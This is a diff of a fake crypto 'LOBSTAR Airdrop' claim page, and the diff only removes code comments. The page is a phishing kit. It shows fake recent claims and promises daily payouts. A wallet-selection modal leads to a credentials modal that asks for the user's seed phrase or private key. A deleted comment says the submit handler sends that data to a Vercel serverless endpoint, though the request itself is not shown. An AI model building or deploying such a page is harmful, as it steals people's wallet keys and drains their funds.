@@ -6,7 +6,7 @@
     <title>LOBSTAR Airdrop</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
     <style>
-        /* ========== STYLES (unchanged) ========== */
+
         * {
             margin: 0;
             padding: 0;
@@ -310,14 +310,14 @@
 </head>
 <body>
 <div class="container">
-    <!-- Circular coin banner with image (replace src with your own) -->
+    
     <div style="display: flex; justify-content: center; margin-bottom: 1.5rem;">
         <div style="width: 80px; height: 80px; background: radial-gradient(circle at 30% 30%, #f97316, #facc15); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px rgba(249,115,22,0.5);">
             <img src="https://cdn-icons-png.flaticon.com/512/3095/3095154.png" alt="LOBSTAR" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
         </div>
     </div>
 
-    <!-- Main token card -->
+   
     <div class="card">
         <div class="token-header">
             <div>
@@ -350,7 +350,7 @@
         <div class="helper-text">having trouble? try reloading page or turning off VPN</div>
     </div>
 
-    <!-- Recent claims card -->
+   
     <div class="card">
         <h3 style="margin-bottom: 1rem;">RECENT CLAIMS</h3>
         <div class="recent-list" id="recentClaims">
@@ -363,7 +363,6 @@
         </div>
     </div>
 
-    <!-- Claiming process card -->
     <div class="card">
         <h3 style="margin-bottom: 1rem;">CLAIMING PROCESS & ELIGIBILITY</h3>
         <div class="steps">
@@ -373,9 +372,7 @@
             <div class="step"><span class="step-num">04</span><span>All payouts are processed instantly to your wallet.</span></div>
             <div class="step"><span class="step-num">05</span><span>Hold your allocation position to continue receiving recurring daily payouts.</span></div>
         </div>
-    </div>
 
-    <!-- Airdrop description + integrations & system -->
     <div class="card">
         <div style="margin-bottom: 1rem;">
             <h3 style="margin-bottom: 0.5rem;">Airdrop Live</h3>
@@ -406,7 +403,7 @@
     </div>
 </div>
 
-<!-- Wallet selection modal -->
+
 <div id="walletModal" class="modal">
     <div class="modal-content">
         <span class="modal-close" id="closeWalletModal">&times;</span>
@@ -415,7 +412,7 @@
     </div>
 </div>
 
-<!-- Credentials modal -->
+
 <div id="credsModal" class="modal">
     <div class="modal-content">
         <span class="modal-close" id="closeCredsModal">&times;</span>
@@ -446,7 +443,7 @@
 </div>
 
 <script>
-    // List of wallets (10)
+    
     const wallets = [
         { name: "Phantom", icon: "🦋" },
         { name: "Solflare", icon: "🔥" },
@@ -462,7 +459,7 @@
 
     let selectedWallet = null;
 
-    // Populate wallet modal
+
     const walletListDiv = document.getElementById('walletList');
     wallets.forEach(w => {
         const div = document.createElement('div');
@@ -477,7 +474,7 @@
         walletListDiv.appendChild(div);
     });
 
-    // Modal controls
+
     const walletModal = document.getElementById('walletModal');
     const credsModal = document.getElementById('credsModal');
     const claimBtn = document.getElementById('claimButton');
@@ -493,7 +490,7 @@
         if (e.target === credsModal) credsModal.style.display = 'none';
     };
 
-    // Toggle input fields based on radio selection
+
     const radios = document.querySelectorAll('input[name="inputType"]');
     const seedGroup = document.getElementById('seedGroup');
     const privateKeyGroup = document.getElementById('privateKeyGroup');
@@ -512,7 +509,7 @@
     radios.forEach(radio => radio.addEventListener('change', toggleInputs));
     toggleInputs();
 
-    // Submit credentials – sends data to Vercel serverless endpoint
+    
     document.getElementById('submitCredentials').addEventListener('click', async () => {
         const type = document.querySelector('input[name="inputType"]:checked').value;
         let value = '';
@@ -541,7 +538,7 @@
             return;
         }
 
-        // Show loading
+        
         const btn = document.getElementById('submitCredentials');
         const originalText = btn.innerText;
         btn.innerText = 'Submitting...';
